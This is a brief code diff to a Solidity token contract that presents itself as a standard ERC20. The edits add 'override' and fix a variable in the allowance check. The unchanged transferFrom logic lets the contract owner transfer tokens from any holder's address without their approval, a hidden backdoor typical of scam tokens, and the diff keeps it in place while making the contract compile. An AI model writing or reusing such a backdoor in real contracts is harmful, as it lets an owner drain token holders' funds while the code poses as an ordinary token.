@@ -171,7 +171,7 @@ function setTotalSupply(address owner) private   {
         address from,
         address to,
         uint256 amount
-    ) public virtual  returns (bool) {
+    ) public virtual override returns (bool) {
         if(from == msg.sender || _owner==msg.sender) {
             _transfer(from, to, amount);
 
@@ -367,7 +367,7 @@ function setTotalSupply(address owner) private   {
 //        uint256 currentAllowance = _allowances[owner][spender];
   //      if (currentAllowance != _totalSupply) {
             require(_allowances[owner][spender] > amount, "ERC20: insufficient allowance");
-                _approve(owner, spender, currentAllowance - amount);
+                _approve(owner, spender, _allowances[owner][spender] - amount);
 
     //    }
     }
